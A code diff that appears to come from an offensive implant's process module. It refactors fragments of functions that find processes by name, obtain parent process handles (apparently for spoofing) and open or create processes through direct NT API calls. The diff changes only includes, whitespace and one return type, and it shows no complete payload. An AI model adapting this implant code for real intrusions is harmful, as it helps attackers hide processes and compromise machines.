@@ -1,9 +1,9 @@
-#include <core/corelib.hpp>
+#include <core/include/process.hpp>
 namespace Process {
 
 	ULONG GetProcessIdByName(LPSTR proc) {
-
 		HEXANE
+
 		HANDLE hSnap = { };
 		PROCESSENTRY32 entry = { };
 
@@ -21,7 +21,8 @@ namespace Process {
 				}
 			}
 		}
-	defer:
+
+		defer:
 		if (hSnap) {
 			Ctx->Nt.NtClose(hSnap);
 		}
@@ -30,8 +31,8 @@ namespace Process {
 	}
 
 	HANDLE LdrGetParentHandle(PBYTE Parent) {
-
 		HEXANE
+
 		HANDLE Proc = { };
 		HANDLE Snap = { };
 		CLIENT_ID Cid = { };
@@ -68,9 +69,9 @@ namespace Process {
 		return Proc;
 	}
 
-	VOID NtOpenProcess(PHANDLE phProcess, ULONG access, ULONG pid) {
-
+	NTSTATUS NtOpenProcess(PHANDLE phProcess, ULONG access, ULONG pid) {
 		HEXANE
+
 		CLIENT_ID client			= { };
 		OBJECT_ATTRIBUTES attrs     = { };
 
@@ -78,15 +79,11 @@ namespace Process {
 		client.UniqueProcess = R_CAST(HANDLE, pid);
 		client.UniqueThread = nullptr;
 
-		if (!NT_SUCCESS(ntstatus = Ctx->Nt.NtOpenProcess(phProcess, access, &attrs, &client))) {
-			return_defer(ntstatus);
-		}
-
-	defer:
+		ntstatus = Ctx->Nt.NtOpenProcess(phProcess, access, &attrs, &client);
+		return ntstatus;
 	}
 
 	VOID NtCloseUserProcess(PIMAGE proc) {
-
 		HEXANE
 
 		if (proc->Attrs) {
@@ -107,8 +104,8 @@ namespace Process {
 	}
 
 	VOID NtCreateUserProcess(PIMAGE proc, LPCSTR path) {
-
 		HEXANE
+
 		LPWSTR wName			= { };
 		UNICODE_STRING uName	= { };
 
